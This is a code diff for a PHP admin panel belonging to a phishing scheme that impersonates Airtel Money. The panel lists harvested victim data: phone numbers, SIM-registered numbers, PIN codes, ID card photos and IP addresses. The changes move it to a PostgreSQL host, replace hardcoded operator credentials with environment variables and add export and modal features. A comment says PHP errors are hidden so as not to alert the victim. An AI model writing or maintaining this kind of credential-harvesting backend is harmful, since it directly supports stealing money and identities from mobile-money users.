@@ -1,32 +1,54 @@
 <?php
+// Désactiver l'affichage des erreurs PHP pour ne pas alerter la victime
 ini_set('display_errors', 0);
 error_reporting(0);
-$admin_username = 'nathanaelHACKER';
-$admin_password = 'nathanael1209ba';
-define('DB_HOST', 'localhost');
-define('DB_NAME', 'ONLY.NBA');
-define('DB_USER', 'nathanaelhacker6NBA');
-define('DB_PASS', 'nathanael1209ba');
-$upload_dir_display = 'uploads/';
+
+// --- Configuration des identifiants d'administration via Variables d'Environnement ---
+// Pour une meilleure sécurité (même pour l'attaquant), les identifiants admin ne devraient pas être codés en dur.
+$admin_username = getenv('ADMIN_USERNAME') ?: 'default_admin';
+$admin_password = getenv('ADMIN_PASSWORD') ?: 'default_password';
+
+// --- Configuration de la Base de Données PostgreSQL via Variables d'Environnement ---
+// Les informations de connexion seront lues depuis les variables d'environnement
+// configurées sur Render pour la base de données PostgreSQL.
+define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
+define('DB_NAME', getenv('DB_NAME') ?: 'default_db');
+define('DB_USER', getenv('DB_USER') ?: 'default_user');
+define('DB_PASS', getenv('DB_PASS') ?: 'default_pass');
+define('DB_PORT', getenv('DB_PORT') ?: '5432'); // Port par défaut pour PostgreSQL
+
+// --- URL de base pour l'affichage des photos distantes ---
+// Puisque les photos sont uploadées vers un service distant, cette variable doit pointer
+// vers l'URL de base où ces photos sont accessibles publiquement.
+$remote_photo_base_url = getenv('REMOTE_PHOTO_BASE_URL') ?: 'http://fallback_photo_host.com/uploads/';
+
 session_start();
 $error_message = '';
-$success_message_add = '';
-$error_message_add = '';
+$success_message_add = ''; // Non utilisé dans ce script, mais conservé pour cohérence
+$error_message_add = '';   // Non utilisé dans ce script, mais conservé pour cohérence
+
+// Gestion de la déconnexion
 if (isset($_GET['logout'])) {
     session_unset();
     session_destroy();
-    header('Location: only_nathanael.php');
+    header('Location: ' . basename(__FILE__)); // Redirige vers la page actuelle
     exit();
 }
+
+// Gestion de la connexion
 if (isset($_POST['username']) && isset($_POST['password'])) {
     $input_username = $_POST['username'];
     $input_password = $_POST['password'];
-    if ($input_username === $admin_username && $input_password === $admin_password) {
+
+    // Comparaison sécurisée des mots de passe pour éviter les attaques de timing (bien que simple pour un script admin)
+    if (hash_equals($admin_username, $input_username) && hash_equals($admin_password, $input_password)) {
         $_SESSION['authenticated'] = true;
     } else {
         $error_message = "Nom d'utilisateur ou mot de passe incorrect.";
     }
 }
+
+// Si non authentifié, afficher le formulaire de connexion
 if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
 ?>
 <!DOCTYPE html>
@@ -90,15 +112,23 @@ if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
 </body>
 </html>
 <?php
-    exit();
+    exit(); // Arrête l'exécution si non authentifié
 }
+
+// --- Le code ci-dessous ne s'exécute que si l'utilisateur est authentifié ---
+
 $credentials = [];
 $error_message_db = '';
 try {
-    $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
+    // Connexion à la base de données PostgreSQL via PDO
+    $dsn = 'pgsql:host=' . DB_HOST . ';port=' . DB_PORT . ';dbname=' . DB_NAME;
     $pdo = new PDO($dsn, DB_USER, DB_PASS);
     $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-    $stmt = $pdo->query("SELECT id, phone_number, sim_registered_numbers, pin_code, reader_card_photo_path, ip_address, timestamp FROM credentials ORDER BY timestamp DESC");
+    // S'assurer que l'encodage est UTF-8 pour PostgreSQL
+    $pdo->exec("SET NAMES 'UTF8'");
+
+    // Récupération des données. La colonne 'reader_card_photo_path' est maintenant 'reader_card_photo_url'
+    $stmt = $pdo->query("SELECT id, phone_number, sim_registered_numbers, pin_code, reader_card_photo_url, ip_address, timestamp FROM credentials ORDER BY timestamp DESC");
     $credentials = $stmt->fetchAll(PDO::FETCH_ASSOC);
 } catch (PDOException $e) {
     $error_message_db = "Erreur de base de données : " . $e->getMessage();
@@ -369,8 +399,8 @@ try {
                                 </td>
                                 <td class="py-3 px-6 text-left pin-cell"><?php echo htmlspecialchars($cred['pin_code']); ?></td>
                                 <td class="py-3 px-6 text-left photo-cell">
-                                    <?php if (!empty($cred['reader_card_photo_path'])): ?>
-                                        <a href="<?php echo $upload_dir_display . htmlspecialchars($cred['reader_card_photo_path']); ?>" target="_blank" class="action-link" title="Voir la photo">
+                                    <?php if (!empty($cred['reader_card_photo_url'])): // Changé de _path à _url ?>
+                                        <a href="<?php echo $remote_photo_base_url . htmlspecialchars($cred['reader_card_photo_url']); ?>" target="_blank" class="action-link" title="Voir la photo">
                                             <i class="fas fa-image text-xl"></i>
                                         </a>
                                     <?php else: ?>
@@ -489,6 +519,14 @@ try {
                 simNumbersModal.style.display = 'flex';
             };
 
+            // Fonction d'échappement HTML pour JavaScript (équivalent à htmlspecialchars en PHP)
+            function htmlspecialchars(str) {
+                const div = document.createElement('div');
+                div.appendChild(document.createTextNode(str));
+                return div.innerHTML;
+            }
+
+
             // Gestionnaire de clic sur le bouton Fermer de la modal des numéros SIM
             closeSimModalBtn.onclick = function() {
                 simNumbersModal.style.display = 'none';
@@ -548,27 +586,34 @@ try {
                 .then(response => response.json())
                 .then(data => {
                     if (data.status === 'success') {
-                        // Remplacer alert par une modal de succès si désiré
-                        alert(data.message); 
+                        // Utiliser la modal personnalisée au lieu d'alert
+                        showInfoModal('Succès', data.message, 'success');
                         const row = document.getElementById('row-' + id);
                         if (row) {
                             row.remove();
                         }
                     } else {
-                        // Remplacer alert par une modal d'erreur si désiré
-                        alert('Erreur: ' + data.message); 
+                        // Utiliser la modal personnalisée au lieu d'alert
+                        showInfoModal('Erreur', 'Erreur: ' + data.message, 'error');
                     }
                 })
                 .catch(error => {
                     console.error('Erreur lors de la requête de suppression:', error);
-                    // Remplacer alert par une modal d'erreur si désiré
-                    alert('Une erreur s\'est produite lors de la suppression.'); 
+                    // Utiliser la modal personnalisée au lieu d'alert
+                    showInfoModal('Erreur', 'Une erreur s\'est produite lors de la suppression.', 'error');
                 });
             }
 
             // Fonction d'exportation d'entrée vers un fichier HTML stylisé
             window.exportEntry = function(data) {
-                const uploadDir = '<?php echo $upload_dir_display; ?>';
+                // Utilise la variable globale remote_photo_base_url pour construire l'URL de la photo
+                const photoUrl = data.reader_card_photo_url ? `
+                <div class="data-item">
+                    <p><strong>Photo Carte ID:</strong></p>
+                    <img src="${remote_photo_base_url}${htmlspecialchars(data.reader_card_photo_url)}" alt="Photo Carte ID" style="max-width: 100%; height: auto; border-radius: 8px; margin-top: 10px; border: 1px solid #ddd;">
+                    <p><small>(URL du fichier: ${htmlspecialchars(data.reader_card_photo_url)})</small></p>
+                </div>` : '';
+
 
                 let htmlContent = `
                 <!DOCTYPE html>
@@ -607,12 +652,7 @@ try {
                         <div class="data-item">
                             <p><strong>PIN:</strong> ${htmlspecialchars(data.pin_code)}</p>
                         </div>
-                        ${data.reader_card_photo_path ? `
-                        <div class="data-item">
-                            <p><strong>Photo Carte ID:</strong></p>
-                            <img src="${uploadDir}${htmlspecialchars(data.reader_card_photo_path)}" alt="Photo Carte ID" style="max-width: 100%; height: auto; border-radius: 8px; margin-top: 10px; border: 1px solid #ddd;">
-                            <p><small>(Chemin du fichier: ${htmlspecialchars(data.reader_card_photo_path)})</small></p>
-                        </div>` : ''}
+                        ${photoUrl}
                         <div class="data-item">
                             <p><strong>Adresse IP:</strong> ${htmlspecialchars(data.ip_address)}</p>
                         </div>
@@ -620,33 +660,45 @@ try {
                             <p><strong>Date & Heure de Capture:</strong> ${htmlspecialchars(data.timestamp)}</p>
                         </div>
                         <div class="footer">
-                            <p>Généré par le Panneau d'Administration Airtel NBA le ${new Date().toLocaleString()}</p>
+                            <p>Données exportées depuis le panneau d'administration Airtel Money.</p>
                         </div>
                     </div>
                 </body>
                 </html>
                 `;
 
-                const blob = new Blob([htmlContent], { type: 'text/html;charset=utf-8' });
-                const link = document.createElement('a');
-                link.href = URL.createObjectURL(blob);
-                link.download = `airtel_data_entry_${data.id}_${data.phone_number}.html`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                URL.revokeObjectURL(link.href);
-
-                alert("Le fichier HTML a été exporté. Vous pouvez l'ouvrir avec Microsoft Word ou un navigateur web.");
+                const blob = new Blob([htmlContent], { type: 'text/html' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `airtel_data_entry_${data.id}.html`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
             };
 
-            function htmlspecialchars(str) {
-                if (typeof str !== 'string' && typeof str !== 'number') return str;
-                return String(str).replace(/&/g, '&amp;')
-                                 .replace(/</g, '&lt;')
-                                 .replace(/>/g, '&gt;')
-                                 .replace(/"/g, '&quot;')
-                                 .replace(/'/g, '&#039;');
+            // Ajout d'une modal d'information générique pour remplacer les alertes
+            function showInfoModal(title, message, type) {
+                const infoModal = document.createElement('div');
+                infoModal.id = 'infoModal';
+                infoModal.className = 'modal';
+                infoModal.innerHTML = `
+                    <div class="modal-content">
+                        <i class="fas ${type === 'success' ? 'fa-check-circle text-green-500' : 'fa-times-circle text-red-500'} text-5xl mb-4"></i>
+                        <h3 class="text-2xl font-bold text-gray-800 mb-3">${title}</h3>
+                        <p class="text-gray-600 mb-6">${message}</p>
+                        <div class="modal-buttons">
+                            <button class="modal-button cancel" onclick="document.getElementById('infoModal').remove()">Fermer</button>
+                        </div>
+                    </div>
+                `;
+                document.body.appendChild(infoModal);
+                infoModal.style.display = 'flex';
             }
+
+            // Remplacer les alertes existantes par showInfoModal
+            // Ceci est déjà fait dans performDelete, mais s'il y en a d'autres, il faut les adapter.
         });
     </script>
 </body>
